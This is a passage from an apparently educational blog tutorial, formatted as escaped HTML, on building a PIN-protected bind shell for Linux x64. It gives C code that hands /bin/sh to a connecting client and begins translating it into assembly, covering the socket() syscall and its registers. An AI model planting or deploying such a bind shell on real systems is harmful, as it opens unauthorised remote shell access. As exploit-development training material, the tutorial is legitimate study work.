	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//length of a structure in bytes&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//execve 2nd and 3rd argument&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;


	&lt;span class=&quot;c1&quot;&gt;//create a new socket&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//bind a name to a socket&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//listen for connections on a socket&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//accept a connection on a socket&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//close old fd&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//duplicate fd-s for newsockfd&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//write&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Enter PIN:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;struct-sockaddr_in-in_addr--sockaddr&quot;&gt;&lt;u&gt;struct sockaddr_in, in_addr &amp;amp; sockaddr&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;AF_INET family is the address family for IPv4 which uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; address structure. The structure itself is defined within the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/include/netinet/in.h&lt;/code&gt; header file along with &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;in_addr&lt;/code&gt; structures. &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; is simply the IPv4 version of the sockaddr structure.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; structure contains:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;sin_family - which is the address family AF_INET&lt;/li&gt;
  &lt;li&gt;sin_port - port number&lt;/li&gt;
  &lt;li&gt;sin_addr - member of the &lt;code class=&quot;highlighter-rouge&quot;&gt;in_addr&lt;/code&gt; structure, which contains the IP address&lt;/li&gt;
  &lt;li&gt;sin_zero[8] - 8 zero bytes for padding, which are reserved for the future cases&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;sa_family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;sa_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in_addr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;in_addr_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* the IP address in network byte order    */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;         &lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* always AF_INET                          */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;         &lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* the service port                        */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in_addr&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* the IP address                          */&lt;/span&gt;
     &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt;            &lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* unused (reserved for expansion          */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the way we should set up our struct should specify the 1) AF_INET address family, 2) port in network byte order for which we can use the htons() syscall, 3) INADDR_ANY (0.0.0.0) - bind a socket to all the interfaces as we want to receive all packets directed to the specified port on all IP addresses.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;syscalls&quot;&gt;&lt;u&gt;Syscalls&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;To achieve the goal set for task 1, we have to understand how and for what we use the following syscalls: &lt;code class=&quot;highlighter-rouge&quot;&gt;socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;socket-syscall&quot;&gt;&lt;b&gt;socket() syscall&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;We use socket() syscall in order to create a new socket for endpoint communication. Socket returns us a file descriptor, which we can use with other syscalls, for example when binding an address to the socket. &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall takes 3 parameters: communication &lt;b&gt;domain&lt;/b&gt; AF_INET for IPv4 Internet protocols, communication &lt;b&gt;type&lt;/b&gt; SOCK_STREAM - a reliable two-way connection and a &lt;b&gt;protocol&lt;/b&gt; - specifies the protocol to be used with the socket. By socket() syscall documentation, normally only a single protocol exists to support a socket type within a protocol family, so we can specify it as 0.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In order to implement this in assembly, we can make use of python to know respective values for AF_INET and SOCKET_STREAM.&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;python&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Nov&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;linux2&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;It’s time to look at the assembly now!&lt;/b&gt; &lt;a href=&quot;https://software.intel.com/en-us/articles/introduction-to-x64-assembly&quot;&gt;x64 calling convention&lt;/a&gt; states that the 1st argument should go to register RDI, 2nd to RSI and 3rd to RDX. The respective syscall value for socket() should go to RAX. Syscall values can easily be found via ausyscall command &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall socket&lt;/code&gt; which is part of the auditd package (&lt;code class=&quot;highlighter-rouge&quot;&gt;apt get install auditd&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ausyscall&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;             &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;socketpair&lt;/span&gt;         &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the assembly code for &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd = socket(AF_INET, SOCK_STREAM, 0);&lt;/code&gt; should look as follows:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;number&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;copysocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;				&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s save the returned fd for later use
	mov rdi, rax
	xor rax, rax

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;bind-syscall&quot;&gt;&lt;b&gt;bind() syscall&lt;/b&gt;&lt;/h4&gt;

